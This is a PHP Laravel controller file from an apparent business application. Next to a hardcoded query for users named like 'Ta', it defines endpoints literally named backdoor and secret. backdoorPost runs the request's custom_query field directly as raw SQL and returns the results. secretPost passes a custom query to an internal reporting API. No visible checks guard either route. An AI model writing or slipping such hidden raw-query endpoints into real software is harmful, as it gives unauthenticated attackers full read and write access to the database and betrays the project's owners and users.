<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\SpecialReport\SpecialReportApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $agendaList = [];
        $users = User::where('name', 'like', '%' . 'Ta' . '%')->get();
        foreach ($users as $user) {
            $agendaList = array_merge($agendaList, collect($user->meetingAgendas)->toArray());
        }

        return $agendaList;
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }

    public function secret()
    {
        return view('secret');
    }

    public function secretPost(Request $request)
    {
        return response()->json((new SpecialReportApi)->GetSpecialReport(date('Y-m-d'), date('Y-m-d'), $request->custom_query)['response'] ?? [], 200);
    }
}
